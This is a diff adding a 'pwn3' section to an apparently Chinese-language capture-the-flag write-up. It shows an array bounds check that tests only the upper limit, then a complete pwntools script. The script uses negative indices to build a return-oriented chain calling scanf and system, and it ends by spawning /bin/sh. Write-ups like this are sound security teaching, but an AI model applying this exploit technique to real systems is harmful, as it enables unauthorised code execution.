@@ -247,3 +247,90 @@ s.interactive()
 
 ## 0x003 pwn3
 
+数组边界上溢
+```
+for ( i = 0; i <= 9; ++i )
+{
+puts("enter index");
+fflush(stdout);
+__isoc99_scanf("%d", &v1);
+puts("enter value");
+fflush(stdout);
+__isoc99_scanf("%d", &v2);
+if ( v1 > 9 )
+  exit(0);
+v5[v1] = v2;
+}
+
+# v5
+-00000030 var_30          dd 11 dup(?)
+-00000004 var_4           dd ?
++00000000  s              db 4 dup(?)
++00000004  r              db 4 dup(?)
++00000008
++00000008 ; end of stack variables
+```
+
+利用负数绕过
+```
+from pwn import *
+
+context.log_level = 'debug'
+
+s = process("./pwn3")
+elf = ELF("./pwn3")
+
+s.readuntil("call you?")
+s.sendline("wooy0ung")
+
+system_addr = elf.symbols['system']
+scanf_addr = elf.symbols['__isoc99_scanf']
+ret_off = 0x3ffffff2	# -14
+pop2_ret = 0x080487ba
+format_addr = 0x804882f
+data_base = 0x8049b24
+
+s.readuntil("index")
+s.sendline("-%s" % (ret_off + 1))
+s.readuntil("value")
+s.sendline("%s" % scanf_addr)
+
+s.readuntil("index")
+s.sendline("-%s" % (ret_off))
+s.readuntil("value")
+s.sendline("%s" % pop2_ret)
+
+s.readuntil("index")
+s.sendline("-%s" % (ret_off - 1))
+s.readuntil("value")
+s.sendline("%s" % format_addr)
+
+s.readuntil("index")
+s.sendline("-%s" % (ret_off - 2))
+s.readuntil("value")
+s.sendline("%s" % data_base)
+
+s.readuntil("index")
+s.sendline("-%s" % (ret_off - 3))
+s.readuntil("value")
+s.sendline("%s" % system_addr)
+
+s.readuntil("index")
+s.sendline("-%s" % (ret_off - 4))
+s.readuntil("value")
+s.sendline("%s" % 0xffffffff)	# padding
+
+s.readuntil("index")
+s.sendline("-%s" % (ret_off - 5))
+s.readuntil("value")
+s.sendline("%s" % data_base)
+
+s.readuntil("index")
+s.sendline("1")
+s.readuntil("value")
+s.sendline("1")
+
+sleep(0.2)
+s.sendline("/bin/sh")
+s.interactive()
+```
